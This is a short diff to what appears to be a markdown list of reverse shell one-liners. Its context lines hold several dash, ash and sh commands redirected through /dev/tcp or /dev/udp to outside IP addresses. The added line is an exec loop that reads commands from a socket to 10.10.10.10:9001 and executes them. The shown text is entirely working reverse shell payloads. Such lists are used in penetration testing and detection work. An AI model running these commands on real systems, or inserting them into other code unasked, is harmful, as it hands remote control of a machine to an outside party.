@@ -53,6 +53,7 @@ dash -i >/dev/tcp/8.8.8.8/1337 2>&1
 ash -i < /dev/udp/10.0.0.5/53
 sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
 sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
+exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
 
 ---
